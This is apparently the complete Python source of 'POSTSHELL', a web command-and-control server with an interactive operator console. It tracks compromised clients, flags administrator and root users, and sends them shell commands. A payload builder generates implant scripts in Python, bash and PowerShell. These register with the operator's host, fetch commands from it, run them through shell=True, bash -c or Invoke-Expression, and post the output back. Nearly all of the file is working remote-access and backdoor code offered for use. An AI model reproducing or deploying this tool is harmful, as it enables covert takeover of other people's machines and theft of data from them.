import http.server
import socketserver
import threading
import sys
import urllib.parse
import time
import readline
import re
import os
import argparse
from collections import defaultdict
import subprocess
import getpass

os.makedirs("session_logs", exist_ok=True)

os.makedirs("tools", exist_ok=True)

# ANSI color codes
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[93m"


clients = {}
client_commands = defaultdict(str)
client_results = defaultdict(list)
lock = threading.Lock()

client_counter = 1
client_id_map = {}

MAIN_COMMANDS = ["list ", "select ", "payload ", "kill ", "exit ", "help ", "? "]
SESSION_COMMANDS = ["background ", "die "]

selected_client = None

ANSI_ESCAPE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

def strip_ansi(s):
    return ANSI_ESCAPE.sub('', s)

class MyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if self.path.startswith("/tools/"):
            filepath = urllib.parse.unquote(self.path.lstrip("/"))
            full_path = os.path.join(os.getcwd(), filepath)

            if os.path.isfile(full_path):
                self.send_response(200)
                if full_path.endswith(".html"):
                    self.send_header("Content-Type", "text/html")
                elif full_path.endswith(".js"):
                    self.send_header("Content-Type", "application/javascript")
                elif full_path.endswith(".css"):
                    self.send_header("Content-Type", "text/css")
                elif full_path.endswith(".exe"):
                    self.send_header("Content-Type", "application/octet-stream")
                else:
                    self.send_header("Content-Type", "application/octet-stream")
                self.end_headers()
                with open(full_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found.")
            return

        client_id = self.path.strip("/").replace(".html", "")
        with lock:
            if client_id in client_commands:
                command = client_commands[client_id]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(command.encode())
                client_commands[client_id] = ""
            else:
                self.send_response(404)
                self.end_headers()

    def do_POST(self):
        os.makedirs("session_logs", exist_ok=True)  # Ensure log directory exists
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        fields = urllib.parse.parse_qs(post_data)

        if self.path == "/register":
            client_id = fields.get("id", [""])[0]
            client_ip = self.client_address[0]
            with lock:
                global client_counter
                if client_id not in client_id_map:
                    client_id_map[client_id] = client_counter
                    client_counter += 1
                clients[client_id] = {
                    "num_id": client_id_map[client_id],
                    "hostname": fields.get("hostname", [""])[0],
                    "username": fields.get("username", [""])[0],
                    "os": fields.get("os", [""])[0],
                    "version": fields.get("version", [""])[0],
                    "arch": fields.get("arch", [""])[0],
                    "ip": client_ip,
                    "last_seen": time.time()
                }
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Registered")

        elif self.path.endswith("/result"):
            client_id = self.path.strip("/").split("/")[0]
            cmd = fields.get("cmd", [""])[0]
            result = fields.get("result", [""])[0]
            client_ip = self.client_address[0]
            with lock:
                client_results[client_id].append((cmd, result))
                # Log to session_logs/<id>_<IP>.log
                log_filename = os.path.join("session_logs", f"{client_id}_{client_ip}.log")
                with open(log_filename, "a") as log_file:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    log_file.write(f"[{timestamp}] CMD: {cmd}\n")
                    log_file.write(f"[{timestamp}] RESULT:\n{result}\n\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Result received")

        else:
            self.send_response(404)
            self.end_headers()


def format_table(data, headers):
    stripped_data = [[strip_ansi(str(cell)) for cell in row] for row in data]
    col_widths = [
        max(len(header), max(len(row[i]) for row in stripped_data))
        for i, header in enumerate(headers)
    ]

    def pad_with_ansi(value, width):
        stripped = strip_ansi(value)
        padding = width - len(stripped)
        return value + ' ' * padding

    def make_row(values, sep="║"):
        return sep + sep.join(
            f" {pad_with_ansi(str(v), col_widths[i])} " for i, v in enumerate(values)
        ) + sep

    def make_divider(left="╠", mid="╬", right="╣", fill="═"):
        return left + mid.join(fill * (w + 2) for w in col_widths) + right

    top = make_divider("╔", "╦", "╗")
    header_row = make_row(headers)
    divider = make_divider()
    body = "\n".join(make_row(row) for row in data)
    bottom = make_divider("╚", "╩", "╝")

    return "\n".join([top, header_row, divider, body, bottom])

def colorize_user(user):
    dangerous = ["admin", "administrator", "root", "system"]
    clean_user = user.strip()
    if clean_user.lower() in dangerous:
        return f"{RED}{clean_user}{RESET}"
    return f"{GREEN}{clean_user}{RESET}"

def completer(text, state):
    global selected_client
    if selected_client:
        options = [cmd for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    else:
        options = [cmd for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def get_client_by_num_id(num_id):
    with lock:
        for cid, info in clients.items():
            if info["num_id"] == num_id:
                return cid
    return None

def show_help():
    print(f"""
{ORANGE}Menu Commands:{RESET}
    help | ?            - Show this menu
    list                - List connected sessions
    select <id>         - Connect to a session
    kill <id>           - Terminate session
    exit                - Exit the server
{ORANGE}Session Commands:{RESET}
    background          - Background session
    die                 - Terminate session
{ORANGE}Payload Menu Commands:{RESET}
    set lhost <ip>      - Set the POSTSHELL IP address
    set lport <port>    - Set the POSTSHELL listening port
    set payload <type>  - Set payload type (EX: sh, py, ps1)
    set checkin <sec>   - Set the check-in wait time (in seconds)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
    """)

def cli():
    global selected_client
    print(f"""{BLUE}
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    Web Command & Control
{RESET}
        """)
    print(f"{GREEN}[+] Server running on port {ORANGE}{port}{RESET}")
    while True:
        try:
            if not selected_client:
                cmd = input(f"{BLUE}postshell>{RESET} ").strip()

                if cmd == "exit":
                    print(f"{RED}[!] Shutting down server and all sessions.{RESET}")
                    with lock:
                        for cid in list(clients.keys()):
                            client_commands[cid] = "exit"
                        clients.clear()
                    time.sleep(1)
                    break

                elif cmd == "list":
                    with lock:
                        if not clients:
                            print(f"{RED}[!] No clients connected.{RESET}")
                            continue

                        headers = ["ID", "IP", "USER", "HOSTNAME", "OS", "VERSION", "ARCH"]
                        data = []
                        sorted_clients = sorted(clients.items(), key=lambda item: item[1]["num_id"])
                        for cid, info in sorted_clients:
                            user_col = colorize_user(info.get("username", "").strip())
                            data.append([
                                str(info["num_id"]),
                                info.get("ip", "N/A"),
                                user_col,
                                info.get("hostname", ""),
                                info.get("os", ""),
                                info.get("version", ""),
                                info.get("arch", "")
                            ])
                        print(format_table(data, headers))

                elif cmd.startswith("select "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            selected_client = client_id
                        else:
                            print(f"{RED}[!] Invalid client ID{RESET}")
                    except:
                        print(f"{RED}[!] Invalid input{RESET}")

                elif cmd.startswith("kill "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            with lock:
                                client_commands[client_id] = "exit"
                                clients.pop(client_id, None)
                            print(f"{RED}[!] Sent kill command to {client_id}{RESET}")
                        else:
                            print(f"{RED}[!] Invalid client ID{RESET}")
                    except:
                        print(f"{RED}[!] Invalid input{RESET}")
                elif cmd == "payload":
                    payload_shell()
                elif cmd in ["help", "?"]:
                    show_help()

            else:
                user = clients[selected_client]['username']
                host = clients[selected_client]['hostname']
                dangerous = ["admin", "administrator", "root", "system"]
                color = RED if user.lower().strip() in dangerous else GREEN
                prompt = f"{color}[{user}@{host}]{RESET}> "
                cmd = input(prompt).strip()

                if cmd == "background":
                    selected_client = None
                elif cmd == "die":
                    with lock:
                        client_commands[selected_client] = "exit"
                        clients.pop(selected_client, None)
                    print(f"{RED}[!] Sent die command to {selected_client}{RESET}")
                    selected_client = None
                elif cmd:
                    with lock:
                        client_commands[selected_client] = cmd
                    time.sleep(1)
                    with lock:
                        results = client_results[selected_client]
                        if results:
                            for c, r in results:
                                print(r)
                            client_results[selected_client].clear()
                        else:
                            print(f"{ORANGE}[<] No result yet{RESET}")
        except KeyboardInterrupt:
            if not selected_client:
                print(f"{RED}\n[!] Use 'exit' to cleanly shut down the server.{RESET}")
            else:
                print(f"{RED}\n[!] Use 'background' to return or 'die' to terminate the session.{RESET}")
## payload builder
PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
payload_settings = {
    "name": "",
    "lhost": "127.0.0.1",
    "lport": "80",
    "payload": "sh",
    "checkin": "1"
}


def payload_completer(text, state):
    options = []
    if readline.get_line_buffer().strip().startswith("set"):
        options = ["set lhost ", "set lport ", "set payload ", "set checkin ", "set name "]
    else:
        options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None


def show_payload_options():
    print(f"{ORANGE}\nCurrent Payload Options:\n{RESET}")
    for key, value in payload_settings.items():
        if value.strip() == "":
            print(f"  {key.upper():10}: {RED}<NOT SET>{RESET}")
        else:
            print(f"  {key.upper():10}: {ORANGE}{value}{RESET}")
    print("")

def payload_help():
    print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
    print(f"    set name <name>     - Set CUSTOM script name | BLANK = DEFAULT")
    print(f"    set lhost <ip>      - Set the POSTSHELL IP address")
    print(f"    set lport <port>    - Set the POSTSHELL listening port")
    print(f"    set payload <type>  - Set payload type (EX: sh, py, ps1)")
    print(f"    set checkin <sec>   - Set the check-in wait time (in seconds)")
    print(f"    options             - Show current payload configuration")
    print(f"    generate            - Generate the payload with current settings")
    print(f"    back                - Return to the main menu")
    print(f"    help                - Show this help menu\n")


def payload_shell():
    readline.set_completer(payload_completer)
    readline.parse_and_bind("tab: complete")

    while True:
        try:
            cmd = input(f"{RED}payload> {RESET}").strip()

            if cmd == "":
                continue
            elif cmd.startswith("set"):
                parts = cmd.split()
                if len(parts) >= 3:
                    key = parts[1].lower()
                    value = " ".join(parts[2:])
                    if key in payload_settings:
                        payload_settings[key] = value
                        print(f"{GREEN}[+] Set {ORANGE}'{key}'{GREEN} to {ORANGE}'{value}'{RESET}")
                    else:
                        print(f"{RED}[-] Unknown setting: {key}{RESET}")
                elif len(parts) == 3 and parts[1].lower() == "waittime":
                    try:
                        waittime_value = int(parts[2])
                        payload_settings["checkin"] = waittime_value
                        print(f"{GREEN}[+] Set {ORANGE}'CHECKIN'{GREEN} to {ORANGE}'{waittime_value}' {GREEN}seconds.{RESET}")
                    except ValueError:
                        print(f"{RED}[-] Invalid value for 'CHECKIN'. Please provide an integer.{RESET}")
                else:
                    print(f"{RED}[!] Usage: set <name|lhost|lport|payload|checkin> <value>{RESET}")
            elif cmd == "generate":
                generate_payload()
            elif cmd == "back":
                print(f"{ORANGE}[*] Returning to main menu.{RESET}")
                readline.set_completer(completer)  # Main menu completer
                readline.parse_and_bind("tab: complete")
                break
            elif cmd == "options":
                show_payload_options()
            elif cmd == "help" or cmd == "?":
                payload_help()
            else:
                print(f"Unknown command. Type {ORANGE}'help'{RESET} for payload options.")
        except KeyboardInterrupt:
            print(f"{ORNAGE}\n[*] Returning to main menu.{RESET}")
            readline.set_completer(completer)  # Main menu completer
            break
        except Exception as e:
            print(f"Error: {e}")


def generate_payload():
    lhost = payload_settings["lhost"]
    lport = payload_settings["lport"]
    payload_type = payload_settings["payload"]
    waittime = payload_settings.get("checkin", 1)  # defaults to 1 second if not set

    if not os.path.exists("tools"):
        os.makedirs("tools")

    if payload_type == "py":
        payload_code = f'''import os
import platform
import socket
import time
import requests
import subprocess
import getpass

SERVER_IP = "{payload_settings['lhost']}"
SERVER_PORT = "{payload_settings['lport']}"
WAITTIME = {waittime}

HOSTNAME = socket.gethostname()
#USER = os.getlogin()
USER = getpass.getuser()
OS = platform.system()
VERSION = platform.release()

try:
    ARCH = subprocess.check_output("uname -m", shell=True).decode().strip()
except subprocess.CalledProcessError:
    ARCH = "Unknown"

ID = f"{{USER}}@{{HOSTNAME}}"
SERVER = f"http://{{SERVER_IP}}:{{SERVER_PORT}}"

def register_client():
    data = {{
        "id": ID,
        "hostname": HOSTNAME,
        "username": USER,
        "os": OS,
        "version": VERSION,
        "arch": ARCH
    }}
    try:
        response = requests.post(f"{{SERVER}}/register", data=data)
        response.raise_for_status()
        print("Client registered successfully.")
    except requests.RequestException as e:
        print(f"Failed to register client: {{e}}")
        exit(1)

def send_result(command, result):
    data = {{
        "cmd": command,
        "result": result
    }}
    try:
        response = requests.post(f"{{SERVER}}/{{ID}}/result", data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send result: {{e}}")

def command_loop():
    while True:
        try:
            response = requests.get(f"{{SERVER}}/{{ID}}.html")
            response.raise_for_status()
            cmd = response.text.strip()

            if cmd:
                if cmd == "exit":
                    print("Received exit command. Terminating client...")
                    break

                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    result = result.decode("utf-8")
                except subprocess.CalledProcessError as e:
                    result = e.output.decode("utf-8")

                send_result(cmd, result)

            time.sleep(WAITTIME)

        except requests.RequestException as e:
            print(f"Error while communicating with server: {{e}}")
            time.sleep(1)

if __name__ == "__main__":
    register_client()
    command_loop()
'''
        custom_name = payload_settings.get("name", "").strip()
        if custom_name:
            filename = f"tools/{custom_name}.{payload_type}"
        else:
            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"

        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")

    
    elif payload_type == "sh":
        payload_code = f"""#!/bin/bash

SERVERIP="{payload_settings['lhost']}"
SERVERPORT="{payload_settings['lport']}"
WAITTIME="{waittime}"

HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname)
VERSION=$(uname -r)
ARCH=$(uname -m)
ID="$USER@$HOSTNAME"
SERVER="http://$SERVERIP:$SERVERPORT"

# Register
curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \\
     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \\
     -d "arch=$ARCH" "$SERVER/register"

# Command loop
while true; do
    CMD=$(curl -s "$SERVER/$ID.html")
    if [ -n "$CMD" ]; then
        if [ "$CMD" == "exit" ]; then
            echo "Received exit command. Terminating client..."
            exit 0
        fi
        RESULT=$(bash -c "$CMD" 2>&1)
        curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
    fi
    sleep $WAITTIME
done
"""
        custom_name = payload_settings.get("name", "").strip()
        if custom_name:
            filename = f"tools/{custom_name}.{payload_type}"
        else:
            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"

        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")

    elif payload_type == "ps1":
        payload_code = f"""$ServerIP = "{payload_settings['lhost']}"
$ServerPort = "{payload_settings['lport']}"
$WAITTIME = "{waittime}" # in seconds

# Get system information
$Hostname = $env:COMPUTERNAME
$userRaw = whoami
$Username = ($userRaw -split '\\\\' | Select-Object -Last 1).Trim()
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$OSNAME = $os.Caption -replace "Microsoft ", ""
$Version = $os.Version
$Arch = $os.OSArchitecture
$ID = "$Username@$Hostname"
$Server = "http://$ServerIP`:$ServerPort"

# Register client information
try {{
    Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{{
        id = $ID
        hostname = $Hostname
        username = $Username
        os = $OSNAME
        version = $Version
        arch = $Arch
    }}
    Write-Host "[*] Registered successfully"
}} catch {{
    Write-Host "[!] Error during registration: $_"
    exit
}}

# Command loop to fetch and execute commands
while ($true) {{
    try {{
        # Retrieve command from the server
        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
        
        if ($Cmd) {{
            # Execute the command and capture the result
            $Result = try {{
                Invoke-Expression $Cmd | Out-String
            }} catch {{
                $_ | Out-String
            }}

            # Send the result back to the server
            try {{
                Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{{
                    cmd = $Cmd
                    result = $Result
                }}
            }} catch {{
                # Error sending result
            }}
        }}
    }} catch {{
        # Error while fetching command
    }}
    
    # Sleep for 1 second before checking again
    Start-Sleep -Seconds $WAITTIME
}}
"""
        custom_name = payload_settings.get("name", "").strip()
        if custom_name:
            filename = f"tools/{custom_name}.{payload_type}"
        else:
            filename = f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"

        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")

    else:
        print(f"{RED}[-] Payload type '{payload_type}' not implemented yet.{RESET}")

def start_server(port):
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer(("", port), MyHandler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    return server

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    server_instance = start_server(port)
    cli()
